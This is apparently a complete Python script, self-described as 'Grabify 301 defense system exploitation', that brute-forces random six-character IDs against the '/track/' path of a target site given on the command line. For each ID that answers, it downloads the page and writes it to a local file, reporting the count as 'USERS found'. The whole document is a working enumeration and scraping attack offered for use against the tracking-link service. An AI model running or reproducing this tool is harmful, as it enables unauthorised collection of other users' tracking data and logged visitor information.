#python 3.5
#usage: sysargv is number of sessions to fuzz 

import http.client
import sys
import string
import random 
import time 
import urllib.request

print("\n    Grabify 301 defense system exploitation\n")
print(" "*19 + "By ZADEW!")
print("="*47)

print("\n")

alfatime = time.time()
file = open('indexgrabify2.txt', 'a')

try:

	wordlist = ['AAAAAA','BBBBBB']
	active = []
	
	var1=0
	var2=0
	
	N = int(sys.argv[2])
	
	for i in range (N):
		wordlist.append(''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range (6)))
		
	try:
		site = sys.argv[1]
		print("[*] Attacking {}".format(site))
		conn = http.client.HTTPConnection(site)
		conn.connect()
		print("[*] Server Online.\n\n")
	except:
		input("\n[!] Server Offline or Invalid URL")
		exit()
	
	connection = http.client.HTTPConnection(site)
	
	if True:
		print("\t [+] Bruteforce in progress\n")
		for word in wordlist:
			word = word.replace("\n","")
			word = "/track/" + word
			host = site + word
			sys.stdout.write("\t [#] Checking " +host),
			connection.request("GET",word)
			response = connection.getresponse()
			var2 = var2 + 1
			if response.status == 200:
				var1 = var1 + 1
				print(' OK')
				active.append(host)
				url = 'http://'+host
				n = urllib.request.urlopen(url).read() #find, replace, write
				file.write("\n\n\n\n\n"+str(n)+"\n")
			else:
				print(' ...')
			connection.close()
			
		
		
		print("\n\nCompleted \n")
		print(var1, "USERS found")
		print(var2, "Total URLs scanned in {} seconds".format((time.time() - alfatime)))
		print("\n") 
		print ("\n".join(active))


except (KeyboardInterrupt, SystemExit):
	print("\n\nCompleted \n")
	print(var1, "USERS found")
	print(var2, "Total URLs scanned in {} seconds".format(time.time() - alfatime))
	print("\n") 
	
	print ("\n".join(active))
